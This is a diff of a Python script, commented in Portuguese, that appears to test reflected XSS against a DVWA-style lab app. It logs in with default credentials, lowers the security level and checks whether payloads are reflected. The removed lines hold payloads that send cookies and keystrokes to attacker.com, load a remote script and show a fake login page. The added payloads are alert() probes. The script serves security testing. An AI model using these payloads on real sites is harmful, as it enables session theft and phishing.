@@ -38,69 +38,70 @@ login_url = f"{base_url}/login.php"
 security_url = f"{base_url}/security.php"
 
 def login_and_setup_security():
-    #response = session.get(login_url)
-    data = {
+    login_response = session.get(login_url)  # Pega a página de login para obter o token CSRF, se houver
+    soup = BeautifulSoup(login_response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
+
+    login_data = {
         'username': 'admin',
         'password': 'password',
         'Login': 'Login',
+        'user_token': user_token  # Inclua o token CSRF se necessário
     }
-    response = session.post(login_url, data=data, headers=headers)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
-    time.sleep(delay) 
+    login_response = session.post(login_url, data=login_data, headers=headers)
     
-    #response = session.get(security_url)
-    data = {
+    # Verifique se o login foi bem sucedido analisando a resposta ou verificando os cookies
+    if 'PHPSESSID' in session.cookies:
+        print("Login successful, PHPSESSID:", session.cookies['PHPSESSID'])
+    else:
+        print("Login failed")
+        return
+
+    # Configure o nível de segurança para baixo
+    security_response = session.get(security_url)
+    soup = BeautifulSoup(security_response.text, 'html.parser')
+    security_token = soup.find('input', {'name': 'user_token'}).get('value')
+    security_data = {
         'security': 'low',
         'seclev_submit': 'Submit',
-        'user_token': user_token
+        'user_token': security_token
     }
-    session.post(security_url, data=data, headers=headers)
-    time.sleep(delay) 
+    session.post(security_url, data=security_data, headers=headers)
     
 def reflected_xss_attack():
     total_tests = 0
     tests_passed = 0
     tests_failed = 0
     details = []
-
-    # Payloads de JavaScript para testar
     payloads = [
-        "<script>alert('XSS');</script>",
-        "<script>fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));</script>",
-        "<script>var i=document.createElement('img'); i.src='http://attacker.com/steal?cookie='+document.cookie; document.body.appendChild(i);</script>",
-        """jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</tiTle/</teXtarEa/</scRipt/--><p" onclick=alert()//>*/<style>/*</style>/*</title>/*</textarea>/*</script>-->""",
-        "<script>if(document.location.href.indexOf('http://legitimate.com')!=-1){document.write('<script src=\"http://attacker.com/malicious.js\"><\/script>');}</script>",
-        "<script>document.body.innerHTML = '<h1>Your session has expired. Please <a href=\"http://fake-login.com\">login again</a>.</h1>';</script>",
-        "<script>document.onkeypress = function(e) { fetch('http://attacker.com/log?key=' + e.key); }</script>",
-        "<object data=data:text/html;base64, PHNjcmlwdD5hbGVydCgnWFNTLUNsb3VkZmxhcmUtQnlwYXNzLUJ5LUVMSVpFVU9QQUlOJyk8L3NjcmlwdD4=>",
+        "<script>alert('XSS')</script>",
+        "\"/><script>alert('XSS')</script>",
+        "javascript:alert('XSS');",
+        "' onmouseover='alert(\"XSS\")'",
+        "<img src=x onerror=alert('XSS')>"
     ]
 
     for payload in payloads:
         encoded_payload = urllib.parse.quote_plus(payload)
         full_url = f"{xss_url}?name={encoded_payload}"
-        response = session.get(full_url)
+        response = session.get(full_url, headers=headers)
         total_tests += 1
 
-        # Verifica se o payload foi refletido no conteúdo da página e o status é 200
-        if 200 <= response.status_code < 300 and payload.strip('<script></script>') in response.text:
+        if payload in response.text:
             tests_passed += 1
             result = "PASSED"
-            print(f"Payload successful: {payload}")
         else:
             tests_failed += 1
             result = "FAILED"
-            print(f"Payload failed: {payload}")
 
         details.append({
             "payload": payload,
+            "response_content": response.text[:500],  # Inclui um trecho da resposta para revisão
             "status_code": response.status_code,
             "result": result
         })
-
         time.sleep(delay)
 
-    # Log dos resultados
     script_name = os.path.splitext(os.path.basename(__file__))[0]
     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     file_name = f"results_{script_name}_{timestamp}.json"
